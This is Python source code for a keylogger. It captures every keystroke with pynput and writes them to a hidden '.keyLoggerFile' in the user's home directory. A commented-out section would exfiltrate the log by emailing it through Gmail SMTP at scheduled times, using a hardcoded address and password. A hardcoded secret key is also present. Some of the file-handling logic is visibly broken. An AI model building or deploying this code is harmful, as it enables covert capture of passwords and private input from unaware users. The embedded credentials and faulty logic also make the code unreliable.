from pynput.keyboard import Key, Listener
from os import getlogin, mkdir, environ
from platform import system
from os.path import exists
from getpass import getuser
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from email.mime.base import MIMEBase
# from email import encoders
# import smtplib
from datetime import datetime

# nowTime = f'{datetime.now().hour}:{datetime.now().minute}'
# endTime = ['9:20', '10:50', '14:20', '15:50', '19:50', '21:00', '17:03']
# sended = False
# email_address = "pysender387@gmail.com"
# password = "ironman0552"

__ENV = {
    'SYSTEM': system(),
    'USERNAME': getuser(),
    'secretKey': b'xjZSFusUGHWgVU9nax92ItYyY1jPUN65ap8qRsVzysw='
}

if system() == 'Linux':
    __ENV['HOME'] = environ['HOME']
    __ENV['keyFile'] = f'{environ["HOME"]}/.keyLoggerFile'
elif system() == 'Windows':
    __ENV['HOME'] = environ['USERPROFILE']
    __ENV['keyFile'] = f'{environ["USERPROFILE"]}\\.keyLoggerFile'

numbers = ['<96>', '<97>', '<98>', '<99>', '<100>',
           '<101>', '<102>', '<103>', '<104>', '<105>']

keys = []
count = 0

if not exists(__ENV['keyFile']):
    with open(__ENV['keyFile'], 'w') as file:
        file.close()


# def send_email(filename, attachment):

#     fromaddr = email_address
#     toaddr = email_address
#     msg = MIMEMultipart()
#     msg['From'] = fromaddr
#     msg['To'] = toaddr
#     msg['Subject'] = "Log File"
#     body = f"{datetime.now()}"
#     msg.attach(MIMEText(body, 'plain'))
#     filename = filename
#     attachment = open(attachment, "rb")
#     p = MIMEBase('application', 'octet-stream')
#     p.set_payload((attachment).read())
#     encoders.encode_base64(p)
#     p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
#     msg.attach(p)
#     s = smtplib.SMTP('smtp.gmail.com', 587)
#     s.starttls()
#     s.login(fromaddr, password)
#     text = msg.as_string()
#     s.sendmail(fromaddr, toaddr, text)
#     s.quit()

#     with open(__ENV['keyFile'], 'w') as file:
#         file.write('')
#         file.close()


def writeFile(keys):
    with open(__ENV['keyFile'], 'a') as file:
        for el in keys:
            k = str(el).replace('\'', '')
            if k.find('space') > 0:
                file.write(' ')
                file.close()
            elif k.find('enter') > 0:
                file.write('\n\r')
                file.close()
            elif k.find('backspace') > 0:
                print(file.read())
                file.close()
            elif k.find('Key') == -1:
                if k in numbers:
                    file.write(f'{numbers.index(str(k))}')
                    file.close()
                else:
                    file.write(k)
                    file.close()


def on_press(key):
    global keys, count, sended, nowTime
    count += 1
    keys.append(key)
    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []
    # nowTime = f'{datetime.now().hour}:{datetime.now().minute}'
    # print(nowTime in endTime)
    # if nowTime in endTime and sended is False:
    #     print('chegou aqui')
    #     send_email('keyLogger.dat', __ENV['keyFile'])
    #     sended = True
    # elif nowTime in endTime and sended == True:
    #     print('chegou aqui 2')
    #     pass
    # else:
    #     print('chegou aqui 3')
    #     sended = False


with Listener(on_press=on_press) as listener:
    listener.join()
